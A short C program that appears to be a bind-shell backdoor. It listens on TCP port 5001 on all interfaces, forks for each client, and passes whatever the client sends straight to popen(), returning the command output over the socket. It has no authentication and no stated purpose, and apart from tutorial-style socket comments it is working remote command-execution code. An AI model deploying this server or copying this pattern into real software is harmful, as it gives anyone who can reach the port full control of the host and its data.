#include <stdio.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <netinet/in.h>

void doprocessing (int sock) {
    int n;
    char buffer[4096];

    bzero(buffer,4096);

    n = read(sock,buffer,4095);
    if (n < 0) {
        perror("ERROR reading from socket");
        exit(1);
    }
   
    FILE* fp = popen(buffer,"r");
    if (fp == NULL){
	    printf("Failed to run command.");
	    return;
    }
    
    char buffersend[4096];
    while (fgets(buffersend, sizeof(buffersend)-1,fp)!=NULL){
	printf("%s", buffersend);
    	write(sock, buffersend, strlen(buffersend));
    }
    pclose(fp);

}

int main( int argc, char *argv[] )
{
    int sockfd, newsockfd, portno, clilen;
    char buffer[4096];
    struct sockaddr_in serv_addr, cli_addr;
    int  n;

    /* First call to socket() function */
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("ERROR opening socket");
        exit(1);
    }
    /* Initialize socket structure */
    bzero((char *) &serv_addr, sizeof(serv_addr));
    portno = 5001;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(portno);
    int yes = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int));

    /* Now bind the host address using bind() call.*/
    if (bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0) {
         perror("ERROR on binding");
         exit(1);
    }
    /* Now start listening for the clients, here 
     * process will go in sleep mode and will wait 
     * for the incoming connection
     */
    listen(sockfd,5);
    clilen = sizeof(cli_addr);
    while (1) 
    {
        newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
        if (newsockfd < 0) {
            perror("ERROR on accept");
            exit(1);
        }
        /* Create child process */
        int pid = fork();
        if (pid < 0) {
            perror("ERROR on fork");
	    exit(1);
        }
        if (pid == 0)  {
            /* This is the client process */
            close(sockfd);
            doprocessing(newsockfd);
            exit(0);
        } else {
            close(newsockfd);
        }
    } /* end of while */
}
